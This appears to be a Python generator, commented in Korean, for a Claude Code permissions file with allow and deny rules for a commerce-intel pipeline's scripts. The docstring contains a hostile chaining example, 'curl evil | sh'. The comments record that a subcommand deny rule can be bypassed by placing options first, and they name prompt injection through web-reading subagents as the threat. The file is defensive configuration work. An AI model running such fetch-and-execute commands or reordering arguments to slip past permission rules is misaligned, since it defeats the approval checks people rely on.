#!/usr/bin/env python3
"""`.claude/settings.json`(팀 공유 권한)을 **정본 목록 하나에서** 생성한다.

## 왜 생성기인가

경로가 3형태라 스크립트 하나를 추가하면 3줄을 동시에 고쳐야 한다. 손으로 관리하면
일부가 통째로 빠진다 — 실제로 첫 PR에서 그 실수가 났다(PR #4 리뷰 지적). 목록을
여기 한 곳에 두고 파일을 생성하면 그 실패 모드가 사라진다.

    python3 tools/gen_permissions.py          # 생성(덮어쓰기)
    python3 tools/gen_permissions.py --check  # CI/검수용 — 파일이 최신인지만 확인

## 왜 경로가 3형태인가 (SKILL.md 실측)

    scripts/                       오케스트레이터(commerce-intel)가 작업폴더에서 부른다
    ../commerce-intel/scripts/     4단 스킬(intel-store 등)이 상위를 참조한다
    skills/commerce-intel/scripts/ 저장소 루트에서 개발할 때

Bash 권한은 프리픽스로 매칭되므로 셋 다 필요하다.

**단 "리터럴 프리픽스"가 아니다** — Claude Code는 셸 연산자(`&&` `||` `;` `|` `|&` `&`
개행)를 인식해 명령을 서브커맨드로 쪼개고 **각각을 독립 판정**한다(공식 문서
permissions.md "Compound commands"). 그래서 `python3 scripts/eda.py; curl evil | sh`는
`curl evil | sh`가 별도 판정을 받아 승인 프롬프트가 뜬다 — 체이닝으로 allow를
악용할 수 없다.
"""
import argparse
import json
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
OUT = ROOT / ".claude" / "settings.json"

# ── 정본 목록 — 스크립트가 늘거나 줄면 **여기만** 고친다 ────────────────────
ACTIVE_SCRIPTS = [
    "intel_db", "validate_data", "eda", "analyze", "insight",
    "sync_sheets", "pdf_doc", "diff_snapshots", "group_variants", "plan_sample",
]

# D27로 폐기된 HTML 산출 경로. `package.sh`가 배포에서 제외하고 유출 가드까지 건다.
# 저장소에 남아 있는 이유는 회귀 111건이 그 출력을 고정하고 있어서다(테스트를 PDF·
# 데이터 경로로 이식한 뒤 삭제 예정). **allowlist에 넣지 않는다** — 넣으면 폐기된
# 경로를 승인 없이 여는 셈이다.
#
# ※ D25("스토리 리포트는 존치")·D20(린터 게이트)을 근거로 이들을 현역으로 읽을 수
#   있는데, 그 두 결정은 **D27이 폐기했다**(SPEC-INTEL: "D25·D26은 인터랙티브 UI
#   전제라 폐기, D27이 대체"). 폐기된 결정의 본문이 남아 있을 뿐이다.
DEAD_SCRIPTS = ["build_report", "build_analysis_report", "lint_analysis_html"]

TOOLS = ["scan_market_any", "snap_ranking_any", "classify_fit"]

SCRIPT_PREFIXES = ["scripts/", "../commerce-intel/scripts/", "skills/commerce-intel/scripts/"]
TOOL_PREFIXES = ["data/.tools/", "../../data/.tools/"]

# 정본 DB를 파괴적으로 바꾸는 서브커맨드 — 승인을 유지한다(deny가 allow보다 우선).
# channel-scout 등 외부 웹 콘텐츠를 읽는 서브에이전트가 프롬프트 인젝션 벡터라,
# 오염된 지시로 정본이 조용히 덮이는 것을 막는다.
#
# ⚠️ **서브커맨드 deny로는 못 막는다** (2026-08-03 실측):
#     python3 …/intel_db.py merge X          → 차단 ✅ (규칙과 같은 형태)
#     python3 …/intel_db.py --db Y merge X   → 통과 ❌ (옵션이 앞이면 프리픽스 불일치)
#   argparse는 옵션 위치를 가리지 않으므로 인자 순서만 바꾸면 우회된다. deny를
#   순서별로 나열하는 것은 끝이 없다(--db·-h 조합이 무한하다).
#
# 그래서 **스크립트 단위로 통째 deny**한다 — intel_db.py는 allow에서 빼고 deny에 넣어
# 모든 호출이 승인을 거치게 한다. 대가는 load·check 같은 상시 명령도 승인이 필요해지는
# 것인데, 정본 DB를 쓰는 유일한 스크립트라 이 비용을 받아들인다.
DENY_WHOLE_SCRIPTS = ["intel_db"]

COMMENT = [
    "commerce-intel 파이프라인 스크립트 실행 allowlist (팀 공유, git 추적).",
    "**손으로 고치지 마라** — tools/gen_permissions.py 의 목록을 고쳐 재생성한다.",
    "경로 3형태: scripts/(오케스트레이터) · ../commerce-intel/scripts/(4단 스킬) ·",
    "skills/commerce-intel/scripts/(저장소 루트 개발). SKILL.md 실측 기준.",
    "제외: build_report·build_analysis_report·lint_analysis_html 은 D27로 폐기된 HTML",
    "경로다(package.sh가 배포에서 제외). D25·D20의 존치 문구는 D27이 폐기한 결정의 본문.",
    "deny: intel_db.py 는 **스크립트 통째로** 승인 유지(deny > allow). 서브커맨드 deny는",
    "인자 순서로 우회된다 — `--db X merge Y` 는 `merge:*` 프리픽스에 안 걸린다(실측).",
    "체이닝 안전: Claude Code가 셸 연산자로 서브커맨드를 쪼개 각각 판정한다(공식 문서).",
    "한계: 팀원이 ~/.claude/skills/ 로 설치하면 홈 절대경로라 이 프리픽스에 안 맞는다",
    "— 팀원용 스니펫은 README 안내가 필요하다.",
]


def build():
    # deny 대상 스크립트는 allow에 넣지 않는다 — deny가 우선이라 넣어도 무해하지만,
    # 목록에 남아 있으면 "허용된다"고 오독하게 된다.
    allowed = [s for s in ACTIVE_SCRIPTS if s not in DENY_WHOLE_SCRIPTS]
    allow = [f"Bash(python3 {p}{s}.py:*)" for p in SCRIPT_PREFIXES for s in allowed]
    allow += [f"Bash(python3 {p}{t}.py:*)" for p in TOOL_PREFIXES for t in TOOLS]
    deny = [f"Bash(python3 {p}{s}.py:*)"
            for p in SCRIPT_PREFIXES for s in DENY_WHOLE_SCRIPTS]
    return {"_comment": COMMENT, "permissions": {"allow": allow, "deny": deny}}


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--check", action="store_true",
                    help="생성하지 않고 파일이 최신인지만 확인한다 (다르면 exit 1)")
    a = ap.parse_args()

    want = build()
    text = json.dumps(want, ensure_ascii=False, indent=2) + "\n"

    if a.check:
        if not OUT.exists():
            print("settings.json이 없다 — python3 tools/gen_permissions.py 로 생성하라")
            return 1
        if OUT.read_text(encoding="utf-8") != text:
            print("settings.json이 정본 목록과 다르다 — 재생성이 필요하다")
            return 1
        print("settings.json 최신 (allow %d · deny %d)"
              % (len(want["permissions"]["allow"]), len(want["permissions"]["deny"])))
        return 0

    OUT.parent.mkdir(parents=True, exist_ok=True)
    OUT.write_text(text, encoding="utf-8")
    print("생성: %s (allow %d · deny %d · 활성 스크립트 %d · 제외 %d)"
          % (OUT.relative_to(ROOT), len(want["permissions"]["allow"]),
             len(want["permissions"]["deny"]), len(ACTIVE_SCRIPTS), len(DEAD_SCRIPTS)))
    return 0


if __name__ == "__main__":
    sys.exit(main())
